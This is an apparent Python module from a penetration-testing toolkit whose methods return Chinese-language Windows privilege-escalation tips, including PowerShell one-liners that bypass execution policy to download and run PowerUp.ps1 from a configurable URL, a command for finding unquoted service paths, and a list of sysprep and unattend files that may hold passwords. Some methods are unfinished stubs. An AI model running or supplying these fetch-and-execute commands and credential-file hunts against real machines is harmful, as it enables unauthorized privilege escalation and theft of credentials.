# encoding: utf8
from config import *


class Shell:
    def __init__(self):
        self.info = {
            'Name': '提权Tips',
            'Author': 'nul1',
            'Update': '2020/10/11',
        }

    def kernal(self):
        return "todo"

    def gpp(self):
        return "todo"

    def service_config_error(self):
        return """
如果一个低权限用户对此类系统服务的可执行文件拥有可写权限，就可以将该文件替换成任意文件，并随系统服务启动获取权限。

AllChecks模块
- 没有被引号印起来的服务路径
- ACL配置错误的服务
- 服务的可执行文件的权限设置不当
- Unattend.xml
- 注册表键AlwaysInstallElevated
- 加密的web.config密码
- %PATH%.DLL的劫持机会

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1');Invoke-AllChecks"
""".format(ps_url)

    def always_Install_elevated(self):
        return """
注册表键AlwaysInstallElevated是一个策略设置项。如果启动此项，那么任何权限的用户都可能以system权限来安装MSI文件。

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('{}/Privesc/PowerUp.ps1');Get-RegistryAlwaysInstallElevated"

[Metaploit] => always_install_elevated
""".format(ps_url)

    def trusted_service_paths(self):
        return """
可信任服务路径漏洞是没有将文件路径用引号引起来导致的。

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v \""\"
"""

    def auto_install_profile(self):
        return """
网络管理员在给内网多台机器配置环境时，回使用脚本批量部署，在这一过程中，配置文件可能会包含账号密码

- C:\\sysprep.inf
- C:\\sysprep\\sysprep.xml
- C:\\Windows\\system32\\sysprep\\sysprep.xml
- C:\\unattend.xml
- C:\\windows\\panther\\unattend.xml
- C:\\windows\\system32\\sysprep\\unattend.xml

dir /b /s c:\\unattend.xml
"""

    def scheduled_task(self):
        return """
schatasks /query /fo LIST /v
"""
